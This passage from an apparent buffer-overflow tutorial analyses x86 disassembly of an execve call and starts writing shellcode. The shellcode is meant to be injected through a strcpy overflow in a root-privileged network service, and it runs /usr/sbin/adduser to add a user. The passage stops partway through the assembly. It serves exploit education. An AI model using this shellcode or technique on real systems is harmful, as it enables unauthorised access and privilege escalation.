<span class="mi">3</span>	<span class="p">}</span></code></pre></figure> <p> Output of the compiler:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span> <span class="nl">foo:</span>
<span class="err">2</span>        <span class="nf">pushl</span>   <span class="o">%</span><span class="nb">ebp</span>
<span class="err">3</span>        <span class="nf">movl</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span> <span class="o">%</span><span class="nb">ebp</span>
<span class="err">4</span>        <span class="nf">subl</span>    <span class="kc">$</span><span class="mi">120</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="err">5</span>        <span class="nf">leave</span>
<span class="err">6</span>        <span class="nf">ret</span></code></pre></figure> <p></p> <p>In line 4 of the assembly code 120 bytes are reserved for the array buff, but according to the C-code the array should be only 100 bytes in size. So, a whole 20 bytes are reserved in excess. Also with other buffer sizes, in almost all cases more memory was allocated than actually necessary. This compiler bug makes it impossible to exploit off-by-one vulnerabilities. In order to achieve a useful result, the For loop termination condition of the foo function has been modified to overwrite the LSB of the saved frame pointer. The corresponding C source code of the example can be found on GitHub.</p> <h1 id="detailed-example-of-creating-an-exploit">Detailed Example of Creating an Exploit</h1> <h2 id="basic-principles">Basic Principles</h2> <p>After discussing classic stack overflows in detail, we will now develop a more extensive exploit that leverages a buffer overflow vulnerability to create a user with root privileges. This scenario assumes the following conditions:</p> <ol> <li>The vulnerable program has been started with elevated (root) privileges.</li> <li>The vulnerable program is network-enabled, allowing attackers to exploit it remotely from another machine.</li> </ol> <p>Further details are beyond this scope; the fully commented source code is available on GitHub. The relevant vulnerability in the source code looks like this:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">calc</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
	<span class="n">strcpy</span> <span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure> <p>After reading input from an external host, the <code class="language-plaintext highlighter-rouge">calc()</code> function is called and given that input. Inside <code class="language-plaintext highlighter-rouge">calc()</code>, a 512-byte buffer (<code class="language-plaintext highlighter-rouge">buff</code>) is allocated, and the string is copied into it using <code class="language-plaintext highlighter-rouge">strcpy()</code>. Because there is no bounds checking, an attacker can trivially cause a buffer overflow.</p> <p>For instance, a simple DoS (Denial of Service) attack could be executed by sending any input larger than 512 bytes, causing the program to crash. However, since the program runs with root privileges, if an attacker succeeds in hijacking the process, they gain elevated permissions on the target system. The generous 512-byte buffer also makes it easy to embed malicious code directly into <code class="language-plaintext highlighter-rouge">buff</code>, potentially along with a NOP sled to increase the likelihood of a successful exploit.</p> <p>We also know that the target system runs on an IA-32/x86 processor. The injected code must be in machine code form, and several steps are involved to produce it:</p> <ol> <li><strong>Implement the desired functions in a C program.</strong></li> <li><strong>Disassemble the C program to analyze the generated machine instructions.</strong></li> <li><strong>Develop a custom assembly program.</strong></li> <li><strong>Assemble the custom program and extract its machine code.</strong></li> <li><strong>Integrate this code into a working exploit.</strong></li> </ol> <h2 id="implementation-of-the-desired-functions-using-a-c-program">Implementation of the Desired Functions Using a C Program</h2> <p>For simplicity, we will create a standard user on the target system. Later, the code can be adapted to create a user with root privileges.</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="mi">1</span>	<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
<span class="mi">2</span>	    <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
<span class="mi">3</span>	    <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/usr/sbin/adduser"</span><span class="p">;</span>
<span class="mi">4</span>	    <span class="n">name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s">"markus"</span><span class="p">;</span>
<span class="mi">5</span>	    <span class="n">name</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s">"-p"</span><span class="p">;</span>
<span class="mi">6</span>	    <span class="n">name</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="s">"$1$7ÏvÙLKÏµ$gSUKG6RALzRA8ryROcTsG0"</span><span class="p">;</span>
<span class="mi">7</span>	    <span class="n">name</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="mi">8</span>	    <span class="n">execve</span><span class="p">(</span><span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">name</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="mi">9</span>	<span class="p">}</span></code></pre></figure> <p>This program creates a user named <code class="language-plaintext highlighter-rouge">"markus"</code> with the specified (already encrypted) password. The encryption value is provided in <code class="language-plaintext highlighter-rouge">name[3]</code>.</p> <p>In lines 2–7, we prepare the parameter list for the <code class="language-plaintext highlighter-rouge">execve</code> function. This list must be an array of null-terminated strings, ending with a <code class="language-plaintext highlighter-rouge">NULL</code> pointer. When <code class="language-plaintext highlighter-rouge">execve</code> is called in line 8, the current program is replaced with the new program code specified by the first parameter (<code class="language-plaintext highlighter-rouge">"/usr/sbin/adduser"</code>). The second parameter, our argument list, is passed to the main function of the program being executed.</p> <h2 id="analysis-of-the-disassembled-c-program">Analysis of the disassembled C Program</h2> <p>After the C source code has been generated, the output of the GCC compiler can be examined in more detail. First, the assembly code of the main function will be examined.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembly</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">main</span><span class="p">:</span>
<span class="err">1</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>				
<span class="err">2</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>			
<span class="err">3</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x28</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>			
<span class="err">4</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dbe0</span><span class="p">,</span><span class="mh">0xffffffd8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">5</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dbf2</span><span class="p">,</span><span class="mh">0xffffffdc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">6</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dbf9</span><span class="p">,</span><span class="mh">0xffffffe0</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">7</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dc00</span><span class="p">,</span><span class="mh">0xffffffe4</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">8</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0xffffffe8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>		
<span class="err">9</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x4</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>			
<span class="err">10</span>	<span class="nf">push</span>   <span class="kc">$</span><span class="mh">0x0</span>				
<span class="err">11</span>	<span class="nf">lea</span>    <span class="mh">0xffffffd8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">12</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">eax</span>				
<span class="err">13</span>	<span class="nf">pushl</span>  <span class="mh">0xffffffd8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>			
<span class="err">14</span>	<span class="nf">call</span>   <span class="mh">0x804cac0</span> <span class="o">&lt;</span><span class="nv">__execve</span><span class="o">&gt;</span>		
<span class="err">15</span>	<span class="nf">add</span>    <span class="kc">$</span><span class="mh">0x10</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
<span class="err">16</span>	<span class="nf">leave</span>
<span class="err">17</span>	<span class="nf">ret</span></code></pre></figure> <p></p> <p>Let’s start the analysis with two already well-known instructions:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>				
<span class="err">2</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span></code></pre></figure> <p> When you enter the main function, the old frame pointer is first saved and then overwritten with the stack pointer.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">3</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x28</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>			
<span class="err">4</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dbe0</span><span class="p">,</span><span class="mh">0xffffffd8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">5</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dbf2</span><span class="p">,</span><span class="mh">0xffffffdc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">6</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dbf9</span><span class="p">,</span><span class="mh">0xffffffe0</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">7</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dc00</span><span class="p">,</span><span class="mh">0xffffffe4</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">8</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0xffffffe8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>		</code></pre></figure> <p></p> <p>In line three, 40 bytes are reserved for the local variables. As can be seen from the C code, however, only a field of five pointers is created, the GCC compiler reserves 20 bytes extra. This can be traced back to the bug of the GCC 3.X compiler, which in our case is no longer tragic. In lines four to eight, the addresses of the string literals are written to the previously reserved region. The string literals are constants that are stored in the data segment of the program.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">9</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x4</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span></code></pre></figure> <p> In line nine another four bytes are reserved on the stack, but the sense of this instruction does not seem to be clear.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">10</span>	<span class="nf">push</span>   <span class="kc">$</span><span class="mh">0x0</span>				
<span class="err">11</span>	<span class="nf">lea</span>    <span class="mh">0xffffffd8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">12</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">eax</span>				
<span class="err">13</span>	<span class="nf">pushl</span>  <span class="mh">0xffffffd8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>					</code></pre></figure> <p> The three parameters of the execv function are then placed on the stack. Make sure that this is done in the reverse order, i. e. that the last parameter is placed on the stack first. Therefore, the parameter NULL is placed on the stack first. Next, the address of the first pointer must be determined in line eleven (this corresponds to the second parameter of the function). In the last step, the address of the string literal name[0] = “/usr/sbin/adduser” is placed on the stack.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">14</span>	<span class="nf">call</span>   <span class="mh">0x804cac0</span> <span class="o">&lt;</span><span class="nv">__execve</span><span class="o">&gt;</span></code></pre></figure> <p> The CALL instruction places the return address on the stack and then branches to the <code class="language-plaintext highlighter-rouge">execve()</code> sub-function. If the <code class="language-plaintext highlighter-rouge">execve()</code> function is executed successfully, it will not return (the current program code is replaced by a new one). Should it still return to <code class="language-plaintext highlighter-rouge">main()</code> in case of an error, the following lines will be executed:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">15</span>	<span class="nf">add</span>    <span class="kc">$</span><span class="mh">0x10</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
<span class="err">16</span>	<span class="nf">leave</span>
<span class="err">17</span>	<span class="nf">ret</span></code></pre></figure> <p> Some cleanup work is done on the stack and finally <code class="language-plaintext highlighter-rouge">main()</code> is left. The next step is to examine the system function <code class="language-plaintext highlighter-rouge">execve()</code> in more detail. This is much more difficult than analyzing <code class="language-plaintext highlighter-rouge">main()</code>. Before doing so, however, it is advisable to sketch the stack. The memory that is allocated too much should not be taken into account.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/example1-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/example1-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/example1-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2018-02-05-buffer-overflows/example1.png" class="img-fluid rounded z-depth-1 imgcenter" width="750px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> <figcaption class="caption"> <b>Figure 8:</b> Analysis of the disassembled C-Program (1). </figcaption> </figure> <p>It is important that the name is not a pointer to one of the string literals, but a pointer to the pointer name[0]. But why do you need a pointer to a pointer? The answer is relatively simple: the program useradd, which is called later, contains a main function to which parameters can be passed. The function header will look something like this:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{....</span> <span class="p">}</span></code></pre></figure> <p> This function header is used if you want to pass a list of arguments to the program. The *argv[] is also a pointer to another pointer, namely the pointer to the pointer of the first argument. In our case, the pointer name assumes exactly the same function. In fact, it is exactly this pointer that will later be handed over to the main function of the “useradd” program. Therefore, it also makes sense to place the pointers of our string literals directly one after the other on the stack. This makes it possible to iterate through the list of pointers without any problems and to read in the individual arguments successively. The null pointer name[4] is used as an end identifier for the pointer list. The following is the assembly code of the execve() function: </p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembly</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">__execve</span><span class="p">:</span>
<span class="err">1</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>			
<span class="err">2</span>	<span class="nf">mov</span>    <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">3</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>		
<span class="err">4</span>	<span class="nf">test</span>   <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">5</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">edi</span>			
<span class="err">6</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebx</span>			
<span class="err">7</span>	<span class="nf">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">edi</span>		
<span class="err">8</span>	<span class="nf">je</span>     <span class="mh">0x804cad6</span> <span class="o">&lt;</span><span class="nv">__execve</span><span class="o">+</span><span class="mi">22</span><span class="o">&gt;</span>
<span class="err">9</span>	<span class="nf">call</span>   <span class="mh">0x0</span>			
<span class="err">10</span>	<span class="nf">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">ecx</span>		
<span class="err">11</span>	<span class="nf">mov</span>    <span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">edx</span>		
<span class="err">12</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebx</span>			
<span class="err">13</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">edi</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>		
<span class="err">14</span>	<span class="nf">mov</span>    <span class="kc">$</span><span class="mh">0xb</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">15</span>	<span class="nf">int</span>    <span class="kc">$</span><span class="mh">0x80</span>			
<span class="err">16</span>	<span class="nf">pop</span>    <span class="o">%</span><span class="nb">ebx</span>			
<span class="err">17</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>		
<span class="err">18</span>	<span class="nf">cmp</span>    <span class="kc">$</span><span class="mh">0xfffff000</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>
<span class="err">19</span>	<span class="nf">jbe</span>    <span class="mh">0x804caff</span> <span class="o">&lt;</span><span class="nv">__execve</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;</span>
<span class="err">20</span>	<span class="nf">neg</span>    <span class="o">%</span><span class="nb">ebx</span>
<span class="err">21</span>	<span class="nf">call</span>   <span class="mh">0x80484bc</span> <span class="o">&lt;</span><span class="nv">__errno_location</span><span class="o">&gt;</span>
<span class="err">22</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">ebx</span><span class="p">,(</span><span class="o">%</span><span class="nb">eax</span><span class="p">)</span>
<span class="err">23</span>	<span class="nf">mov</span>    <span class="kc">$</span><span class="mh">0xffffffff</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>
<span class="err">24</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">ebx</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
<span class="err">25</span>	<span class="nf">pop</span>    <span class="o">%</span><span class="nb">ebx</span>
<span class="err">26</span>	<span class="nf">pop</span>    <span class="o">%</span><span class="nb">edi</span>
<span class="err">27</span>	<span class="nf">pop</span>    <span class="o">%</span><span class="nb">ebp</span>
<span class="err">28</span>	<span class="nf">ret</span></code></pre></figure> <p></p> <p>The first lines are almost identical to the main function:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>			
<span class="err">2</span>	<span class="nf">mov</span>    <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">3</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>		
<span class="err">4</span>	<span class="nf">test</span>   <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span></code></pre></figure> <p> In line two, the EAX register is set to zero and a TEST instruction with this register is executed in line four. This command causes a bitwise AND operation without modifying the operands. Only the corresponding flags in the status register are set or deleted. In this case, as we will see below, only the fact that the zero flag is set is of interest.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">5</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">edi</span>			
<span class="err">6</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebx</span>			
<span class="err">7</span>	<span class="nf">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">edi</span></code></pre></figure> <p> The registers EDI and EBX are then saved to the stack. The instruction in line seven loads the pointer name[0] into the register EDI.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">8</span>	<span class="nf">je</span>     <span class="mh">0x804cad6</span> <span class="o">&lt;</span><span class="nv">__execve</span><span class="o">+</span><span class="mi">22</span><span class="o">&gt;</span></code></pre></figure> <p> If the zero-flag is set, the system branches to line eight. This is, as already mentioned, always the case. The program flow is therefore always continued in line ten.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">10</span>	<span class="nf">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">ecx</span>		
<span class="err">11</span>	<span class="nf">mov</span>    <span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">edx</span>		
<span class="err">12</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebx</span></code></pre></figure> <p> The instructions in line ten or eleven cause the third parameter with the value NULL to be copied to EDX and the pointer name to ECX. Afterwards the EBX register is saved on the stack again (it doesn’t seem to make much sense).</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">13</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">edi</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>		
<span class="err">14</span>	<span class="nf">mov</span>    <span class="kc">$</span><span class="mh">0xb</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">15</span>	<span class="nf">int</span>    <span class="kc">$</span><span class="mh">0x80</span></code></pre></figure> <p> Before a software interrupt is triggered in line 15, the registers EBX and EAX are set to the value 0xb and to the pointer name[0]. As can be seen from the “System Call Table” of our Linux system, the value 0xb (11) corresponds exactly to the system call “sys_execve” provided by the operating system. The remaining lines 16 - 28 are not considered further, since they are only executed in the event of an error in the system call. We will introduce a simple error handling later.</p> <p>Apparently, all arguments to the system call were stored in different registers. In fact, for system calls with fewer than 6 parameters, the arguments are all stored in the EBX, ECX, EDX, ESI and EDI registers in turn. The number of the desired call is always stored in the register EAX and the return value of the system call is also written back to EAX. In our case, the registers are described as follows: EAX: 11 (No. of system-call execve) EBX: name[0] ECX: name EDX: NULL</p> <p>If we compare this with the call execve (name[0], name, NULL), the assignment of the registers also makes sense, the order of the parameters was kept.</p> <h2 id="development-of-a-custom-assembly-program">Development of a Custom Assembly Program</h2> <p>Following our detailed analysis of the compiler-generated assembly code, we can now write a much more compact version. Before diving in, however, two points need consideration:</p> <ol> <li> <p><strong>String Literals Placement</strong><br> Previously, we observed that string literals are stored in the data segment. But when injecting executable code into a target system, we only have access to the input buffer—there is no separate data segment available for our injected payload. Therefore, the necessary strings must be placed immediately after our executable code. Thanks to the <code class="language-plaintext highlighter-rouge">JMP/CALL</code> construct mentioned earlier, the addresses of these strings can later be computed correctly in the injected code.</p> </li> <li> <p><strong>Error Handling</strong><br> Proper error handling for system calls has not yet been implemented. Here, we will opt for the simplest possible approach: if a system call fails, the process should exit gracefully with an <code class="language-plaintext highlighter-rouge">exit()</code> system call. The system call number for <code class="language-plaintext highlighter-rouge">exit()</code> on Linux is <code class="language-plaintext highlighter-rouge">1</code>; it expects a status code as an argument. The assembly code below demonstrates how to implement this functionality.</p> </li> </ol> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">	<span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x1</span><span class="p">,</span> <span class="o">%</span><span class="nb">eax</span>
	<span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span> <span class="o">%</span><span class="nb">ebx</span>
	<span class="nf">int</span> <span class="kc">$</span><span class="mh">0x80</span></code></pre></figure> <p> Below is a brief summary of the steps required to create a working code to corrupt the target system:</p> <ol> <li>Correct placement of strings after the actual code</li> <li>Determine the individual string addresses and place them in a suitable place</li> <li>Storing a NULL pointer (directly behind the string addresses)</li> <li>Null termination of the individual strings (not done automatically!!)</li> <li>Setting the four registers EAX up to EDX</li> <li>Triggering a software interrupt</li> <li>Error handling The code should have the following structure:</li> </ol> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/examplestructure-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/examplestructure-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/examplestructure-1400.webp 1400w," type="image/webp" sizes="95vw"></source> <img src="/assets/img/2018-02-05-buffer-overflows/examplestructure.png" class="img-fluid rounded z-depth-1 imgcenter" width="600px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> <figcaption class="caption"> <b>Figure 9:</b> Exploit code structure. </figcaption> </figure> <p>Some initial runnable code might look like this:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">jmp</span> <span class="nv">data</span>
<span class="nl">start:</span>
	<span class="nf">popl</span> <span class="o">%</span><span class="nb">esi</span>             <span class="err">#</span> <span class="nv">Base</span> <span class="nv">Address</span> <span class="nv">der</span> <span class="nv">Strings</span> <span class="nv">vom</span> <span class="nv">Stack</span> <span class="nv">holen</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">esi</span><span class="p">,</span><span class="mi">63</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> 		
	<span class="nf">leal</span> <span class="mi">18</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">67</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>			
	<span class="nf">leal</span> <span class="mi">25</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">71</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>		
	<span class="nf">leal</span> <span class="mi">28</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">75</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>		
	<span class="nf">movb</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">17</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>    <span class="err">#</span> <span class="nv">Termination</span> <span class="nv">of</span> <span class="nv">the</span> <span class="nv">Strings</span>
	<span class="nf">movb</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">24</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">movb</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">27</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">movb</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">62</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x7D</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>  <span class="err">#</span> <span class="nv">NULL</span><span class="o">-</span><span class="nv">Pointer</span> <span class="nv">at</span> <span class="nv">end</span> <span class="nv">of</span> <span class="nv">pointer</span> <span class="nv">list</span>
	<span class="nf">movl</span> <span class="kc">$</span><span class="mh">0xb</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>        <span class="err">#</span> <span class="nv">Code</span> <span class="nv">of</span> <span class="nv">SysCall</span><span class="o">-</span><span class="nv">table</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">esi</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>        <span class="err">#</span> <span class="nv">Address</span> <span class="nv">of</span> <span class="nv">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
	<span class="nf">leal</span> <span class="mi">63</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">ecx</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="p">[</span><span class="nv">A</span><span class="p">]</span> <span class="nv">to</span> <span class="nb">ECX</span> <span class="p">(</span><span class="nv">name</span><span class="p">[])</span>
	<span class="nf">leal</span> <span class="mh">0x7D</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">edx</span>  <span class="err">#</span> <span class="nv">Address</span> <span class="nv">of</span> <span class="nv">null</span> <span class="nv">pointer</span> <span class="nv">to</span> <span class="nb">EDX</span>
	<span class="nf">int</span> <span class="kc">$</span><span class="mh">0x80</span>             <span class="err">#</span> <span class="nv">Trigger</span> <span class="nv">Interrupt</span>
